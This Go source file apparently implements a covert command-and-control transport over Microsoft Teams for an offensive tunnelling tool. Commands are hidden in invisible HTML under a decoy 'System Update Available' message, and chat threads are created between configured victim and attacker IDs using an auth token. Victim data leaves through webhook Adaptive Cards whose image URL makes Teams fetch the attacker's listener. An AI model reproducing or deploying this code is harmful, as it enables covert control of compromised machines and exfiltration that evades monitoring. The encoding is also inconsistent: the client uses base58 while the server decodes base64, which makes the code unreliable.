//go:build teams
// +build teams

package simplex

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chainreactors/rem/x/encoders"

	"github.com/chainreactors/logs"
)

func init() {
	RegisterSimplex("teams", func(addr *SimplexAddr) (Simplex, error) {
		return NewTeamsClient(addr)
	}, func(network, address string) (Simplex, error) {
		return NewTeamsServer(network, address)
	}, func(network, address string) (*SimplexAddr, error) {
		return ResolveTeamsAddr(network, address)
	})
}

const (
	DefaultTeamsInterval = 3000  // 3秒间隔
	MaxTeamsMessageSize  = 28000 // Teams 消息大小限制
)

// Teams 配置结构
type TeamsConfig struct {
	WebhookURL string // Teams Webhook URL (客户端发送数据用)
	ChatURL    string // Teams Chat API URL (服务端发送命令用)
	AuthToken  string // Teams 认证 Token (服务端用)
	VictimID   string // 受害者 ID
	AttackerID string // 攻击者 ID
}

func ResolveTeamsAddr(network, address string) (*SimplexAddr, error) {
	u, err := url.Parse(address)
	if err != nil {
		return nil, fmt.Errorf("invalid teams address: %v", err)
	}

	var interval int
	if intervalStr := u.Query().Get("interval"); intervalStr != "" {
		interval, err = strconv.Atoi(intervalStr)
		if err != nil {
			return nil, err
		}
	} else {
		interval = DefaultTeamsInterval
	}

	addr := &SimplexAddr{
		URL:         u,
		id:          u.Path,
		interval:    time.Duration(interval) * time.Millisecond,
		maxBodySize: MaxTeamsMessageSize,
		options:     u.Query(),
	}

	return addr, nil
}

// TeamsServer 实现服务端 (启动HTTP服务器 + 使用Chat API发送命令)
type TeamsServer struct {
	addr    *SimplexAddr
	config  *TeamsConfig
	buffers sync.Map
	client  *http.Client
	server  *http.Server

	// 用于接收通过SSRF传来的数据
	dataChan chan *SimplexPacket
	addrChan chan *SimplexAddr

	ctx    context.Context
	cancel context.CancelFunc
}

// TeamsClient 实现客户端 (使用Webhook发送包含SSRF URL的消息)
type TeamsClient struct {
	addr   *SimplexAddr
	config *TeamsConfig
	buffer *SimplexBuffer
	client *http.Client

	ctx    context.Context
	cancel context.CancelFunc
}

// Teams Webhook 消息结构
type TeamsWebhookPayload struct {
	Type        string                   `json:"type"`
	Attachments []TeamsWebhookAttachment `json:"attachments"`
}

type TeamsWebhookAttachment struct {
	ContentType string            `json:"contentType"`
	Content     TeamsAdaptiveCard `json:"content"`
}

type TeamsAdaptiveCard struct {
	Schema  string                 `json:"$schema"`
	Type    string                 `json:"type"`
	Version string                 `json:"version"`
	Body    []TeamsAdaptiveElement `json:"body"`
}

type TeamsAdaptiveElement struct {
	Type   string `json:"type"`
	Text   string `json:"text,omitempty"`
	Size   string `json:"size,omitempty"`
	Weight string `json:"weight,omitempty"`
	URL    string `json:"url,omitempty"`
}

// Teams Chat API 消息结构
type TeamsMessage struct {
	Type        string `json:"type"`
	Content     string `json:"content"`
	MessageType string `json:"messagetype"`
	ContentType string `json:"contenttype"`
}

// 创建 Teams 服务端
func NewTeamsServer(network, address string) (*TeamsServer, error) {
	addr, err := ResolveTeamsAddr(network, address)
	if err != nil {
		return nil, err
	}
	addr.Scheme = "simplex+" + addr.Scheme
	config := &TeamsConfig{
		WebhookURL: getOption(addr, "webhook"),
		ChatURL:    getOption(addr, "chat_url"),
		AuthToken:  getOption(addr, "auth_token"),
		VictimID:   getOption(addr, "victim"),
		AttackerID: getOption(addr, "attacker"),
	}

	// 从 URL 参数获取代理配置
	proxyURL := getOption(addr, "proxy")
	httpClient := createHTTPClient(proxyURL)

	// 如果没有提供 ChatURL，尝试构建
	if config.ChatURL == "" && config.VictimID != "" && config.AttackerID != "" && config.AuthToken != "" {
		chatURL, err := createChatThread(config.VictimID, config.AttackerID, config.AuthToken, httpClient)
		if err != nil {
			logs.Log.Warnf("Failed to create chat thread: %v", err)
		} else {
			config.ChatURL = chatURL
		}
	}

	ctx, cancel := context.WithCancel(context.Background())

	server := &TeamsServer{
		addr:     addr,
		config:   config,
		client:   httpClient,
		dataChan: make(chan *SimplexPacket, 100),
		addrChan: make(chan *SimplexAddr, 100),
		ctx:      ctx,
		cancel:   cancel,
	}

	// 启动 HTTP 服务器监听 SSRF 请求
	go server.startHTTPServer()

	return server, nil
}

// 创建 Teams 客户端
func NewTeamsClient(addr *SimplexAddr) (*TeamsClient, error) {
	config := &TeamsConfig{
		WebhookURL: getOption(addr, "webhook"),
	}

	ctx, cancel := context.WithCancel(context.Background())

	// 从 URL 参数获取代理配置
	proxyURL := getOption(addr, "proxy")
	httpClient := createHTTPClient(proxyURL)

	client := &TeamsClient{
		addr:   addr,
		config: config,
		buffer: NewSimplexBuffer(addr),
		client: httpClient,
		ctx:    ctx,
		cancel: cancel,
	}

	return client, nil
}

// 服务端启动 HTTP 服务器 (类似 ConvoC2 的 listener)
func (s *TeamsServer) startHTTPServer() {
	mux := http.NewServeMux()

	// 处理客户端数据传输 (统一的数据接收处理)
	mux.HandleFunc("/data/", func(w http.ResponseWriter, r *http.Request) {
		encodedData := strings.TrimPrefix(r.URL.Path, "/data/")
		data, err := base64.URLEncoding.DecodeString(encodedData)
		if err != nil {
			logs.Log.Errorf("Failed to decode data: %v", err)
			return
		}

		// 解析数据包
		packets, err := ParseSimplexPackets(data)
		if err != nil {
			logs.Log.Errorf("Failed to parse simplex packets: %v", err)
			return
		}

		// 发送到接收通道
		for _, pkt := range packets.Packets {
			select {
			case s.dataChan <- pkt:
			case <-s.ctx.Done():
				return
			}
		}

		// 创建地址信息
		clientAddr := &SimplexAddr{
			URL: &url.URL{
				Scheme: "teams-client",
				Host:   r.RemoteAddr,
			},
			id: r.RemoteAddr,
		}

		select {
		case s.addrChan <- clientAddr:
		case <-s.ctx.Done():
			return
		}

		w.WriteHeader(http.StatusOK)
	})

	s.server = &http.Server{
		Addr:    s.addr.Host,
		Handler: mux,
	}

	if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		logs.Log.Errorf("Teams HTTP server error: %v", err)
	}
}

func (s *TeamsServer) Addr() *SimplexAddr {
	return s.addr
}

// 服务端方法实现
func (s *TeamsServer) Receive() (*SimplexPacket, *SimplexAddr, error) {
	select {
	case <-s.ctx.Done():
		return nil, nil, io.ErrClosedPipe
	case pkt := <-s.dataChan:
		// 同时获取对应的地址
		select {
		case addr := <-s.addrChan:
			return pkt, addr, nil
		case <-s.ctx.Done():
			return nil, nil, io.ErrClosedPipe
		default:
			// 如果没有对应的地址，使用默认地址
			return pkt, s.addr, nil
		}
	default:
		return nil, nil, nil
	}
}

func (s *TeamsServer) Send(pkts *SimplexPackets, addr *SimplexAddr) (int, error) {
	if pkts == nil || pkts.Size() == 0 {
		return 0, nil
	}

	// 通过 Teams Chat API 发送命令 (隐藏在 HTML 中)
	data := pkts.Marshal()
	return s.sendTeamsCommand(data)
}

func (s *TeamsServer) Close() error {
	s.cancel()
	if s.server != nil {
		return s.server.Close()
	}
	return nil
}

func (c *TeamsClient) Addr() *SimplexAddr {
	return c.addr
}

// 客户端方法实现
func (c *TeamsClient) Receive() (*SimplexPacket, *SimplexAddr, error) {
	select {
	case <-c.ctx.Done():
		return nil, nil, io.ErrClosedPipe
	default:
		pkt, err := c.buffer.GetPacket()
		if err != nil || pkt == nil {
			return nil, c.addr, err
		}
		return pkt, c.addr, err
	}
}

func (c *TeamsClient) Send(pkts *SimplexPackets, addr *SimplexAddr) (int, error) {
	if pkts == nil || pkts.Size() == 0 {
		return 0, nil
	}

	// 通过 Teams Webhook 发送包含 SSRF URL 的消息
	data := pkts.Marshal()
	return c.sendTeamsWebhookWithSSRF(data)
}

func (c *TeamsClient) Close() error {
	c.cancel()
	return nil
}

// 服务端发送命令 (通过 Teams Chat API)
func (s *TeamsServer) sendTeamsCommand(data []byte) (int, error) {
	if s.config.ChatURL == "" || s.config.AuthToken == "" {
		return 0, fmt.Errorf("missing chat URL or auth token")
	}

	// 将命令数据编码为 base64
	encodedData := base64.URLEncoding.EncodeToString(data)

	content := fmt.Sprintf(`<p>System Update Available</p><span aria-label="%s" style="display:none;"></span>`, encodedData)

	message := TeamsMessage{
		Type:        "Message",
		Content:     content,
		MessageType: "RichText/Html",
		ContentType: "Text",
	}

	jsonData, err := json.Marshal(message)
	if err != nil {
		return 0, err
	}

	req, err := http.NewRequest("POST", s.config.ChatURL, bytes.NewReader(jsonData))
	if err != nil {
		return 0, err
	}

	req.Header.Set("Authorization", s.config.AuthToken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := s.client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	all, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, err
	}
	fmt.Println(string(all))

	if resp.StatusCode != http.StatusCreated {
		return 0, fmt.Errorf("teams API returned status: %d", resp.StatusCode)
	}

	logs.Log.Debugf("Teams command sent successfully, size: %d bytes", len(data))
	return len(data), nil
}

// 客户端发送数据 (通过 Teams Webhook 触发 SSRF)
func (c *TeamsClient) sendTeamsWebhookWithSSRF(data []byte) (int, error) {
	if c.config.WebhookURL == "" {
		return 0, fmt.Errorf("missing webhook URL ")
	}

	// 将数据编码为 base64
	encodedData := encoders.B58Encode(data)

	// 构造 SSRF URL (Teams 会访问这个URL)
	ssrfURL := fmt.Sprintf("http://%s/data/%s", c.addr.Host, encodedData)

	// 创建包含 SSRF URL 的 Adaptive Card
	payload := TeamsWebhookPayload{
		Type: "message",
		Attachments: []TeamsWebhookAttachment{
			{
				ContentType: "application/vnd.microsoft.card.adaptive",
				Content: TeamsAdaptiveCard{
					Schema:  "http://adaptivecards.io/schemas/adaptive-card.json",
					Type:    "AdaptiveCard",
					Version: "1.2",
					Body: []TeamsAdaptiveElement{
						{
							Type:   "TextBlock",
							Text:   "Performance Report",
							Size:   "Medium",
							Weight: "Bolder",
						},
						{
							Type: "Image",
							URL:  ssrfURL, // 关键：Teams 会访问这个URL
							Size: "Small",
						},
					},
				},
			},
		},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return 0, err
	}

	req, err := http.NewRequest("POST", c.config.WebhookURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return 0, err
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := c.client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 202 {
		return 0, fmt.Errorf("webhook returned status: %d", resp.StatusCode)
	}

	logs.Log.Debugf("Teams SSRF webhook sent successfully, size: %d bytes", len(data))
	return len(data), nil
}

// 创建聊天线程 (复用之前的实现)
func createChatThread(victimID, attackerID, token string, httpClient *http.Client) (string, error) {
	const createThreadURL = "https://teams.microsoft.com/api/chatsvc/amer/v1/threads"
	const chatBaseURL = "https://teams.microsoft.com/api/chatsvc/amer/v1/users/ME/conversations/"
	const chatEndURL = "/messages"

	requestBody := fmt.Sprintf(`{
        "members": [
            {"id": "%s", "role": "Admin"},
            {"id": "%s", "role": "Admin"}
        ],
        "properties": {
            "threadType": "chat",
            "fixedRoster": true,
			"isStickyThread":"true"
        }
    }`, attackerID, victimID)

	req, err := http.NewRequest("POST", createThreadURL, bytes.NewBuffer([]byte(requestBody)))
	if err != nil {
		return "", err
	}

	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	location := resp.Header.Get("Location")
	if location == "" {
		return "", fmt.Errorf("no location header found in the response")
	}

	// 提取 Thread ID
	re := regexp.MustCompile(`.*/threads/(.*)`)
	match := re.FindStringSubmatch(location)
	if len(match) < 2 {
		return "", fmt.Errorf("could not extract thread ID from Location header")
	}

	threadID := match[1]
	return chatBaseURL + threadID + chatEndURL, nil
}
